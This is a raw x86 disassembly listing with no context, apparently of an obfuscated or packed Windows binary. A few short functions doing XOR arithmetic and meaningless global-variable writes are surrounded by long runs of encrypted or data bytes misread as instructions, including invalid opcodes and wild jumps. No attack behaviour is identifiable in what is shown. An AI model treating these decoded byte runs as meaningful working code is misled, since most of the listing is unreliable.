  40821d:	sbb    BYTE PTR [ebp+0x2d],bl
  408220:	xchg   edx,eax
  408221:	mov    ah,0xe9
  408223:	xchg   ebp,eax
  408224:	fiadd  DWORD PTR [ebx-0x78]
  408227:	lahf   
  408228:	xchg   ch,ah
  40822a:	pop    edi
  40822b:	or     cl,cl
  40822d:	adc    BYTE PTR [ebx+0x31],ch
  408230:	ja     0x40823b
  408232:	jae    0x4081d7
  408234:	(bad)  
  408235:	div    DWORD PTR [eax-0x5a]
  408238:	inc    ecx
  408239:	mov    BYTE PTR [esi+0x62],dh
  40823c:	sub    dl,BYTE PTR [ebx+0x6225279f]
  408242:	cli    
  408243:	push   ds
  408244:	cmp    BYTE PTR [ebp-0x78],ah
  408247:	outs   dx,DWORD PTR ds:[esi]
  408248:	xchg   edi,eax
  408249:	mov    dl,0x1e
  40824b:	adc    ebx,eax
  40824d:	push   ecx
  40824e:	cmp    DWORD PTR [eax],esi
  408250:	mov    dh,BYTE PTR [eax+0x6672afff]
  408256:	pop    esi
  408257:	xchg   edi,eax
  408258:	xor    edx,DWORD PTR [ebx+0x34cf8c94]
  40825e:	jmp    0x408208
  408260:	lock adc ch,BYTE PTR [esi-0x17690604]
  408267:	je     0x408268
  408269:	ret    
  40826a:	jp     0x408234
  40826c:	stos   BYTE PTR es:[edi],al
  40826d:	ins    DWORD PTR es:[edi],dx
  40826e:	out    dx,al
  40826f:	test   eax,0xea74a8a9
  408274:	mov    ds:0x85ad5d01,eax
  408279:	mov    al,ds:0x486d6bce
  40827e:	inc    ecx
  40827f:	sbb    al,0x2c
  408281:	push   es
  408282:	pusha  
  408283:	pop    esi
  408284:	cmp    eax,0x8bb7fac5
  408289:	cmp    al,0xa6
  40828b:	loop   0x408236
  40828d:	lea    eax,ds:0x27ea48bb
  408293:	addr16 cmp al,0x86
  408296:	sbb    bh,bl
  408298:	retf   
  408299:	and    eax,0x90d126ca
  40829e:	xchg   edx,eax
  40829f:	gs dec ebx
  4082a1:	push   ss
  4082a2:	pop    es
  4082a3:	jle    0x40831f
  4082a5:	arpl   bp,bx
  4082a7:	mov    esp,0x9e0b885e
  4082ac:	mov    DWORD PTR [esi-0x4e],esi
  4082af:	xlat   BYTE PTR ds:[ebx]
  4082b0:	in     al,0x8b
  4082b2:	inc    edi
  4082b3:	xchg   ecx,eax
  4082b4:	imul   BYTE PTR [edi]
  4082b6:	clc    
  4082b7:	cmp    eax,0x7403e25
  4082bc:	outs   dx,BYTE PTR ds:[esi]
  4082bd:	out    dx,eax
  4082be:	adc    eax,0x853df03b
  4082c3:	jne    0x4082fb
  4082c5:	mov    eax,0x46003d71
  4082ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082cb:	add    eax,0xa8bf9cd1
  4082d0:	loopne 0x4082e9
  4082d2:	pop    esp
  4082d3:	mov    cl,BYTE PTR [eax-0xd]
  4082d6:	shl    eax,cl
  4082d8:	dec    esi
  4082d9:	mov    ecx,0x1fc56c2d
  4082de:	addr16 mov al,0x5b
  4082e1:	repnz mov dh,ah
  4082e4:	push   eax
  4082e5:	lods   al,BYTE PTR ds:[esi]
  4082e6:	xchg   ebx,eax
  4082e7:	ror    bl,0x53
  4082ea:	lods   al,BYTE PTR ds:[esi]
  4082eb:	mov    al,0xd8
  4082ed:	sub    al,0x63
  4082ef:	(bad)  
  4082f0:	hlt    
  4082f1:	pop    ebp
  4082f2:	push   ecx
  4082f3:	cmp    al,0x36
  4082f5:	push   ecx
  4082f6:	mov    ebx,0xa65e9e98
  4082fb:	cmc    
  4082fc:	retf   
  4082fd:	push   0x74d5cdba
  408302:	jo     0x4082de
  408304:	retf   
  408305:	(bad)  
  408307:	lods   al,BYTE PTR ds:[esi]
  408308:	xor    dl,BYTE PTR [edx+0x47c76de8]
  40830e:	cmp    eax,0xd65d638f
  408313:	mov    bh,BYTE PTR [ebp-0x2afd4f78]
  408319:	std    
  40831a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40831b:	pop    ebp
  40831c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831d:	test   DWORD PTR [esi-0x13],eax
  408320:	es pop edx
  408322:	fcomp  QWORD PTR [ebx+0x205ff7d5]
  408328:	js     0x4082e2
  40832a:	imul   DWORD PTR [ebp+ecx*4+0x729d1084]
  408331:	xor    al,BYTE PTR [eax]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	cmc    
  40847e:	outs   dx,DWORD PTR ds:[esi]
  40847f:	leave  
  408480:	xchg   BYTE PTR [ecx-0x24],ah
  408483:	jle    0x408503
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x40840b
  40848a:	iret   
  40848b:	inc    DWORD PTR [ebx]
  40848d:	lahf   
  40848e:	test   BYTE PTR [ebx],ch
  408490:	cdq    
  408491:	pop    edx
  408492:	xchg   edi,eax
  408493:	sub    al,0x25
  408495:	pop    edx
  408496:	jbe    0x4084ff
  408498:	pusha  
  408499:	test   eax,0x85c09d68
  40849e:	xchg   esp,eax
  40849f:	xchg   BYTE PTR [ecx-0x7c],bl
  4084a2:	jae    0x40849c
  4084a4:	pop    ds
  4084a5:	stc    
  4084a6:	scas   al,BYTE PTR es:[edi]
  4084a7:	sbb    BYTE PTR [ebp-0xf8c41cd],bh
  4084ad:	adc    ebp,DWORD PTR [edi+edi*4+0x686bd317]
  4084b4:	or     ah,BYTE PTR [edx+0x70b60020]
  4084ba:	push   edx
  4084bb:	std    
  4084bc:	aam    0x75
  4084be:	jns    0x4084d4
  4084c0:	and    al,0x9
  4084c2:	mov    eax,ebp
  4084c4:	mov    ch,0xe2
  4084c6:	sbb    eax,0x3b4ad13
  4084cb:	popf   
  4084cc:	(bad)  
  4084ce:	mov    cl,0x4
  4084d0:	sbb    DWORD PTR [eax+0x91ff370],edi
  4084d6:	pop    edx
  4084d7:	mov    esp,0x68aa1bae
  4084dc:	shr    BYTE PTR [ebx],cl
  4084de:	adc    al,0xb4
  4084e0:	push   ecx
  4084e1:	add    ch,BYTE PTR [edi]
  4084e3:	ror    DWORD PTR ds:0xbea3f03d,cl
  4084e9:	lods   al,BYTE PTR ds:[esi]
  4084ea:	dec    eax
  4084eb:	pop    esi
  4084ec:	push   eax
  4084ed:	ja     0x408488
  4084ef:	jmp    0x4084e0
  4084f1:	cmp    BYTE PTR [ecx],dh
  4084f3:	sbb    BYTE PTR [edx+0x13],cl
  4084f6:	pop    ecx
  4084f7:	xor    eax,0xe8ad4506
  4084fc:	push   0x6111147d
  408501:	lahf   
  408502:	cmc    
  408503:	push   cs
  408504:	cli    
  408505:	nop
  408506:	xchg   esp,eax
  408507:	fs push esp
  408509:	push   edi
  40850a:	jmp    0x7dd1fc0d
  40850f:	test   al,0x6f
  408511:	push   0x20
  408513:	xchg   ebp,eax
  408514:	lahf   
  408515:	loop   0x408525
  408517:	dec    ecx
  408518:	imul   BYTE PTR [eax*1-0x6958af3e]
  40851f:	inc    ebx
  408520:	imul   eax,DWORD PTR [ecx+ecx*4+0x89c45b5],0xa590ed31
  40852b:	cmp    DWORD PTR [ecx-0x5c],0x67dcab4e
  408532:	outs   dx,BYTE PTR ds:[esi]
  408533:	in     al,dx
  408534:	mov    eax,ds:0xd9183731
  408539:	mov    esp,0x225bd6b0
  40853e:	clc    
  40853f:	add    cl,BYTE PTR [esi+edx*8-0x7e]
  408543:	jmp    DWORD PTR [eax]
  408545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408546:	and    al,0xe3
  408548:	add    bh,al
  40854a:	bound  ebx,QWORD PTR [edx-0x178ccf38]
  408550:	lods   eax,DWORD PTR ds:[esi]
  408551:	xchg   ecx,eax
  408552:	xor    bh,dh
  408554:	xor    BYTE PTR [ebx-0x5165503d],ch
  40855a:	xchg   esi,eax
  40855b:	nop
  40855c:	or     edx,DWORD PTR [eax-0x2c7f6746]
  408562:	inc    ecx
  408563:	in     al,0xeb
  408565:	push   esp
  408566:	iret   
  408567:	inc    ebp
  408568:	pop    edi
  408569:	jmp    0x408516
  40856b:	ins    DWORD PTR es:[edi],dx
  40856c:	sbb    ebp,DWORD PTR [eax+eax*4]
  40856f:	sub    cl,al
  408571:	sbb    ebp,esp
  408573:	sbb    al,BYTE PTR [ecx+eiz*1+0x67]
  408577:	push   edx
  408578:	sti    
  408579:	aaa    
  40857a:	xchg   edx,eax
  40857b:	mov    ds:0xe7640c44,eax
  408580:	jo     0x40857a
  408582:	dec    ebx
  408583:	adc    BYTE PTR [eax-0x6d],cl
  408586:	push   cs
  408587:	fsubr  QWORD PTR [esi+eax*2-0x45]
  40858b:	add    dl,ah
  40858d:	test   DWORD PTR [ebx],esi
  40858f:	jg     0x4085f6
  408591:	pushf  
  408592:	stos   DWORD PTR es:[edi],eax
  408593:	adc    ebx,DWORD PTR [ecx-0x1c6f30e4]
  408599:	push   ecx
  40859a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40859b:	lds    ebp,FWORD PTR [si+0x5702]
  4085a0:	call   FWORD PTR [ebp+0x55219ed1]
  4085a6:	std    
  4085a7:	mov    eax,ds:0x93d4e3c6
  4085ac:	std    
  4085ad:	sbb    al,0x8d
  4085af:	add    BYTE PTR [edx-0x76],al
  4085b2:	cmp    eax,esp
  4085b4:	or     al,BYTE PTR [eax-0x20]
  4085b7:	push   ss
  4085b8:	fst    DWORD PTR ds:0x482630c0
  4085be:	mov    al,ds:0x44a996d1
  4085c3:	add    ecx,DWORD PTR [esi+0x6e]
  4085c6:	fwait
  4085c7:	pop    ebx
  4085c8:	sub    al,0xd0
  4085ca:	xor    al,0x2a
  4085cc:	ins    BYTE PTR es:[edi],dx
  4085cd:	jbe    0x408557
  4085cf:	sbb    BYTE PTR [ecx+0x162c177e],0xef
  4085d6:	fcomp  QWORD PTR [ebx-0x1ba24f7e]
  4085dc:	sbb    edi,DWORD PTR [ebp+0x582875a5]
  4085e2:	ds fwait
  4085e4:	jl     0x408567
  4085e6:	dec    esi
  4085e7:	jae    0x4085a5
  4085e9:	mov    edx,0x6769f73d
  4085ee:	xchg   edx,eax
  4085ef:	aas    
  4085f0:	push   edx
  4085f1:	xor    DWORD PTR [ecx-0x54],edx
  4085f4:	in     al,dx
  4085f5:	xchg   esp,eax
  4085f6:	add    DWORD PTR [esi+0x3a11eaae],ebp
  4085fc:	xchg   ebx,eax
  4085fd:	shr    BYTE PTR [esi+0x324e9f2d],1
  408603:	mov    ds:0x9e44ed3f,al
  408608:	hlt    
  408609:	push   ds
  40860a:	ret    
  40860b:	mov    bh,0x7f
  40860d:	ins    DWORD PTR es:[edi],dx
  40860e:	xor    bl,cl
  408610:	cwde   
  408611:	scas   eax,DWORD PTR es:[edi]
  408612:	push   eax
  408613:	fimul  DWORD PTR [ebp+0x2ff3bd2e]
  408619:	push   eax
  40861a:	call   esp
  40861c:	inc    ecx
  40861d:	mov    BYTE PTR [edx],ah
  40861f:	push   cs
  408620:	add    DWORD PTR [ecx+0x7c],eax
  408623:	rcl    DWORD PTR [ebx-0x3f929652],0x39
  40862a:	cmp    BYTE PTR [ebx-0x76374909],ah
  408630:	mov    ah,0xd1
  408632:	add    BYTE PTR [esi+0x5e],cl
  408635:	repz cwde 
  408637:	cmc    
  408638:	sbb    DWORD PTR [edi-0x40],eax
  40863b:	jbe    0x40864d
  40863d:	inc    ecx
  40863e:	(bad)  
  40863f:	clc    
  408640:	xor    eax,0xae9b5856
  408645:	ret    
  408646:	cmp    al,0x24
  408648:	xchg   esi,eax
  408649:	cdq    
  40864a:	imul   edx,DWORD PTR [eax+0x18],0x5e
  40864e:	fld    QWORD PTR [eax+eax*8]
  408651:	and    al,0x66
  408653:	xor    eax,0xd0b1d774
  408658:	ret    0x24c4
  40865b:	(bad)  
  40865c:	jg     0x408692
  40865e:	jno    0x4086c9
  408660:	jae    0x408612
  408662:	or     eax,0xf60af71d
  408667:	sbb    ch,BYTE PTR [edi+0x7993b51d]
  40866d:	adc    ah,ch
  40866f:	adc    edi,DWORD PTR [edx-0x4c]
  408672:	mov    esi,0xee7c5b61
  408677:	lods   eax,DWORD PTR ds:[esi]
  408678:	rcl    DWORD PTR [ecx+0x339ac5e8],0x16
  40867f:	xchg   ebp,eax
  408680:	in     eax,dx
  408681:	adc    eax,0xf3bfc998
  408686:	fsub   DWORD PTR [esi+0x76665953]
  40868c:	jl     0x40868a
  40868e:	das    
  40868f:	sub    ebx,edi
  408691:	xchg   edx,eax
  408692:	sub    DWORD PTR [edi+0x653e1c72],ebp
  408698:	int    0x2f
  40869a:	mov    esi,0xf4a2af5
  40869f:	imul   edi,DWORD PTR [esi+0x75],0xa53623d6
  4086a6:	outs   dx,BYTE PTR ds:[esi]
  4086a7:	push   0xffffffb6
  4086a9:	arpl   WORD PTR [eax+0xf67f260],dx
  4086af:	ret    0xde6f
  4086b2:	xor    eax,esp
  4086b4:	sbb    DWORD PTR [ecx],eax
  4086b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086b7:	(bad)  
  4086b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b9:	sub    BYTE PTR [edx-0x69ca18c8],ch
  4086bf:	cmp    BYTE PTR [edx+ebx*1],dh
  4086c2:	enter  0xb61c,0x85
  4086c6:	adc    DWORD PTR [bx+si-0x2c],ebx
  4086ca:	loope  0x408676
  4086cc:	jmp    0x15f709fe
  4086d1:	sub    al,0x36
  4086d3:	sub    BYTE PTR [edi],bl
  4086d5:	push   edi
  4086d6:	popa   
  4086d7:	mov    dh,bh
  4086d9:	out    dx,eax
  4086da:	std    
  4086db:	lods   al,BYTE PTR ss:[esi]
  4086dd:	not    ecx
  4086df:	adc    al,0xbc
  4086e1:	aaa    
  4086e2:	les    esp,FWORD PTR [edx+0x48376642]
  4086e8:	sti    
  4086e9:	fmulp  st(4),st
  4086eb:	pop    DWORD PTR [ebx]
  4086ed:	(bad)  
  4086ef:	scas   eax,DWORD PTR es:[edi]
  4086f0:	not    edx
  4086f2:	test   esi,ebp
  4086f4:	int3   
  4086f5:	jl     0x4086de
  4086f7:	or     esi,ecx
  4086f9:	ds pop esp
  4086fb:	and    ax,0x8898
  4086ff:	leave  
  408700:	fisttp WORD PTR [ebp+0x4]
  408703:	leave  
  408704:	in     al,0x51
  408706:	push   esi
  408707:	not    DWORD PTR [ebp-0x54f62136]
  40870d:	mov    dl,0xda
  40870f:	adc    BYTE PTR [ebx-0x76],bh
  408712:	mov    bl,0xbf
  408714:	outs   dx,DWORD PTR ds:[esi]
  408715:	out    dx,eax
  408716:	out    0x89,al
  408718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408719:	inc    ecx
  40871a:	add    esi,DWORD PTR [eax]
  40871c:	(bad)  
  40871d:	sub    esi,edi
  40871f:	cdq    
  408720:	sbb    BYTE PTR [edi],0xb5
  408723:	loop   0x408744
  408725:	cs inc esi
  408727:	in     al,0x50
  408729:	pop    ebp
  40872a:	ins    DWORD PTR es:[edi],dx
  40872b:	shl    DWORD PTR ds:0x806049bf,0xc6
  408732:	mov    dh,0xf5
  408734:	mov    edi,DWORD PTR [esi-0x48]
  408737:	sahf   
  408738:	inc    esi
  408739:	and    eax,0xd74e878f
  40873e:	loope  0x408753
  408740:	fiadd  WORD PTR [ecx-0x34f32403]
  408746:	xchg   edi,eax
  408747:	ss inc ecx
  408749:	push   ebp
  40874a:	sub    bl,BYTE PTR [eax+edi*4-0x5d]
  40874e:	retf   0xceb0
  408751:	sti    
  408752:	push   ebp
  408753:	fs xchg esp,eax
  408755:	and    edi,0x1f984f5e
  40875b:	out    dx,eax
  40875c:	retf   0x6
  40875f:	dec    ebp
  408760:	pop    eax
  408761:	addr16 es mov esi,0x71acb3ae
  408768:	inc    edx
  408769:	sbb    BYTE PTR [ecx+0x33],0xd2
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  ecx,QWORD PTR [edx]
  40878b:	ja     0x4087c6
  40878d:	ins    DWORD PTR es:[edi],dx
  40878e:	inc    ebx
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408768
  408797:	pop    eax
  408798:	inc    ecx
  408799:	pop    DWORD PTR [edi]
  40879b:	pop    ds
  40879c:	cmc    
  40879d:	scas   al,BYTE PTR es:[edi]
  40879e:	xor    DWORD PTR [eax],ebx
  4087a0:	mov    dl,0x1b
  4087a2:	ficomp DWORD PTR ds:0xc6c41876
  4087a8:	outs   dx,DWORD PTR ds:[esi]
  4087a9:	add    eax,0x78366718
  4087ae:	adc    ebx,DWORD PTR [edx+0x4690d6b5]
  4087b4:	mov    al,0x87
  4087b6:	and    DWORD PTR [ebp-0x486eaa9f],ebp
  4087bc:	mov    ds:0xee40a915,eax
  4087c1:	shl    BYTE PTR ds:0x6ca72364,cl
  4087c7:	popa   
  4087c8:	jg     0x408837
  4087ca:	jle    0x4087e6
  4087cc:	xor    esp,DWORD PTR [edx-0x503f17ca]
  4087d2:	inc    eax
  4087d3:	jns    0x408760
  4087d5:	jmp    0x408793
  4087d7:	sub    ebp,DWORD PTR [eax+0x3a2af84f]
  4087dd:	sbb    eax,0x67ac5f1d
  4087e2:	hlt    
  4087e3:	rol    DWORD PTR [esi+edi*1],cl
  4087e6:	jg     0x40880e
  4087e8:	cld    
  4087e9:	cmp    eax,0x4bb24b29
  4087ee:	mov    al,0xf3
  4087f0:	call   0xbf71:0x6143d106
  4087f7:	fisttp DWORD PTR [ebx+ebx*8]
  4087fa:	add    BYTE PTR [edx+0x79],0xb8
  4087fe:	mov    ch,0x32
  408800:	xchg   esi,eax
  408801:	scas   eax,DWORD PTR es:[edi]
  408802:	pop    ecx
  408803:	inc    edx
  408804:	das    
  408805:	scas   eax,DWORD PTR es:[edi]
  408806:	test   DWORD PTR [eax+0x30],edx
  408809:	rcl    DWORD PTR [eax-0x8d5c44c],cl
  40880f:	or     eax,0x81c50319
  408814:	push   es
  408815:	add    dh,BYTE PTR [ebx+0x3efe8394]
  40881b:	test   edi,esi
  40881d:	in     al,dx
  40881e:	loope  0x408887
  408820:	ss mov ebx,0x94b10eb5
  408826:	retf   0x979c
  408829:	stc    
  40882a:	add    BYTE PTR [edx+0x8],bh
  40882d:	xchg   BYTE PTR [esi],dh
  40882f:	(bad)  
  408830:	ror    ecx,cl
  408832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408833:	mov    DWORD PTR [edx-0x20],eax
  408836:	jmp    0x125d4003
  40883b:	psubusb mm2,QWORD PTR [edx+0x11cfa658]
  408842:	stc    
  408843:	xchg   ecx,eax
  408844:	adc    eax,0x617054cf
  408849:	mov    bh,0xfd
  40884b:	cmp    DWORD PTR [ebx-0x3],ebx
  40884e:	xchg   ebp,eax
  40884f:	dec    edi
  408850:	sbb    BYTE PTR [esp+ebx*2-0xa],ah
  408854:	outs   dx,BYTE PTR ds:[esi]
  408855:	jl     0x408848
  408857:	cld    
  408858:	or     BYTE PTR [esi+0x5],al
  40885b:	aam    0x72
  40885d:	mov    edi,0xd20e34e5
  408862:	push   edx
  408863:	out    0x16,al
  408865:	mov    bl,0x10
  408867:	mov    ebx,edi
  408869:	dec    DWORD PTR [eax-0x191154ec]
  40886f:	cli    
  408870:	sbb    bl,bh
  408872:	repz sahf 
  408874:	inc    ecx
  408875:	loop   0x4088ac
  408877:	out    dx,al
  408878:	mov    edx,0xdc7a1c1c
  40887d:	lahf   
  40887e:	add    ah,BYTE PTR [ebx-0xcb70791]
  408884:	fnstcw WORD PTR [ebx+0x31b74cd1]
  40888a:	add    BYTE PTR [ebx+0x22],cl
  40888d:	sub    DWORD PTR [ecx+0x2a6e4f99],0x6ab6ec54
  408897:	sbb    al,0x5
  408899:	mov    ebp,0x1431b98c
  40889e:	mov    edi,0xc978432f
  4088a3:	inc    esp
  4088a4:	icebp  
  4088a5:	push   cs
  4088a6:	push   ecx
  4088a7:	repnz or eax,0x991b952a
  4088ad:	xchg   ebp,eax
  4088ae:	imul   edx,DWORD PTR [edx-0x68],0xe4698eb3
  4088b5:	mov    eax,0x6b725a9f
  4088ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088bb:	inc    eax
  4088bc:	mov    esi,0x9d450aec
  4088c1:	ja     0x4088df
  4088c3:	lods   al,BYTE PTR ds:[esi]
  4088c4:	rcr    DWORD PTR [ecx-0x35],cl
  4088c7:	jae    0x40890e
  4088c9:	jb     0x4088da
  4088cb:	aad    0x52
  4088cd:	arpl   ax,bp
  4088cf:	or     al,BYTE PTR [esi+0x2c]
  4088d2:	int    0xfb
  4088d4:	mov    bh,0x89
  4088d6:	or     al,0x16
  4088d8:	mov    eax,0xe3a1b30
  4088dd:	pop    ebp
  4088de:	adc    bl,0xdb
  4088e1:	mov    ebp,0x827c8f02
  4088e6:	aaa    
  4088e7:	xadd   BYTE PTR [eax-0x76],dl
  4088eb:	fld    TBYTE PTR [edx-0x1551899e]
  4088f1:	mov    DWORD PTR [edi+0x2f],ecx
  4088f4:	cmp    ecx,0xaab83d3c
  4088fa:	inc    edi
  4088fb:	mov    bl,0xee
  4088fd:	sti    
  4088fe:	mov    eax,ds:0xc7d706d2
  408903:	mov    cs,WORD PTR [ebx+0x4d003498]
  408909:	mov    bh,BYTE PTR ds:0x91c8f2d3
  40890f:	popf   
  408910:	push   edx
  408911:	and    BYTE PTR [eax-0x1ca2d6f1],bl
  408917:	or     eax,0x47d3cced
  40891c:	(bad)  
  40891d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40891e:	sub    eax,0x654d9a42
  408923:	or     ebx,DWORD PTR [ebx+eax*1-0x42fb5ea7]
  40892a:	or     bl,BYTE PTR ds:0x1e0ad8cc
  408930:	mov    esi,0xd6f818e6
  408935:	dec    ebx
  408936:	adc    eax,0xee61fc03
  40893b:	xchg   BYTE PTR [edi-0x1c],ah
  40893e:	jge    0x40894a
  408940:	cmp    edi,DWORD PTR [edx+ecx*1-0x1dd0273f]
  408947:	aas    
  408948:	add    BYTE PTR [ebx+eiz*2-0x37],0xef
  40894d:	call   0x64b4b9c1
  408952:	dec    DWORD PTR [edi+0x3b]
  408955:	dec    ebx
  408956:	pop    es
  408957:	cmc    
  408958:	or     al,0x4b
  40895a:	das    
  40895b:	push   cs
  40895c:	mov    edx,0x52f7849a
  408961:	shl    BYTE PTR [eax],0x93
  408964:	gs xchg edx,eax
  408966:	mov    ss,WORD PTR [edx]
  408968:	mov    edi,0x371b384
  40896d:	or     DWORD PTR [edi+0x5f70ad79],esi
  408973:	cdq    
  408974:	sub    edi,DWORD PTR [edx+0x7fd05d8e]
  40897a:	fdiv   DWORD PTR [ebx]
  40897c:	sbb    ecx,DWORD PTR [ebx+0x20568996]
  408982:	rcr    DWORD PTR [eax+0x1d0ae4a0],0xac
  408989:	call   0x7464fe6a
  40898e:	cmp    bh,ch
  408990:	stc    
  408991:	mov    bh,0xe2
  408993:	cld    
  408994:	mov    eax,0xe4365227
  408999:	cmp    al,0x0
  40899b:	inc    edx
  40899c:	or     al,0x4f
  40899e:	jne    0x40893c
  4089a0:	fimul  WORD PTR [ecx-0x70]
  4089a3:	lods   al,BYTE PTR ds:[esi]
  4089a4:	or     DWORD PTR [eax],ebx
  4089a6:	cmp    eax,0xc7b82b05
  4089ab:	out    0x5b,al
  4089ad:	xchg   esp,eax
  4089ae:	push   es
  4089af:	fwait
  4089b0:	pop    ebp
  4089b1:	push   esi
  4089b2:	adc    BYTE PTR [edi-0x1d],bh
  4089b5:	cmp    edi,esp
  4089b7:	pop    ss
  4089b8:	mov    eax,DWORD PTR [edx]
  4089ba:	pusha  
  4089bb:	sbb    al,0x5a
  4089bd:	out    dx,eax
  4089be:	scas   eax,DWORD PTR es:[edi]
  4089bf:	stos   BYTE PTR es:[edi],al
  4089c0:	add    BYTE PTR [esi-0x4eba03f9],0xb
  4089c7:	pop    ss
  4089c8:	shr    DWORD PTR [edi-0x4a],cl
  4089cb:	daa    
  4089cc:	mov    al,0x46
  4089ce:	xlat   BYTE PTR ds:[ebx]
  4089cf:	std    
  4089d0:	or     BYTE PTR [edi-0x627cbe71],al
  4089d6:	repz inc esi
  4089d8:	and    ch,BYTE PTR [eax-0xc4901a2]
  4089de:	popf   
  4089df:	(bad)  
  4089e0:	js     0x408a52
  4089e2:	dec    edi
  4089e3:	clc    
  4089e4:	mov    al,ds:0x4c5ad733
  4089e9:	adc    eax,0x1e4be859
  4089ee:	out    dx,al
  4089ef:	push   cs
  4089f0:	jmp    FWORD PTR [edi-0x2f016d2e]
  4089f6:	test   al,0xdb
  4089f8:	outs   dx,BYTE PTR ds:[esi]
  4089f9:	gs xchg ecx,eax
  4089fb:	fwait
  4089fc:	push   es
  4089fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ff:	jp     0x4089de
  408a01:	imul   esi,DWORD PTR [esi+0x67039d3b],0x15e0419d
  408a0b:	add    BYTE PTR [ebp-0x1f913fc6],cl
  408a11:	std    
  408a12:	adc    BYTE PTR [ebx-0x63533ca5],al
  408a18:	lea    ecx,[ecx+0x18adb20]
  408a1e:	xor    eax,0xd6463ed
  408a23:	loope  0x408a99
  408a25:	pop    eax
  408a26:	(bad)
  408a29:	retf   
  408a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2b:	aam    0x27
  408a2d:	adc    eax,0xa8130982
  408a32:	clc    
  408a33:	xchg   ecx,eax
  408a34:	inc    edi
  408a35:	je     0x4089fa
  408a37:	test   ah,ah
  408a39:	mov    bl,0x12
  408a3b:	pop    ebp
  408a3c:	adc    BYTE PTR [edx+0x4902d1c0],dh
  408a42:	xor    bl,bh
  408a44:	jg     0x408a9a
  408a46:	(bad)  
  408a47:	cdq    
  408a48:	xchg   dh,dl
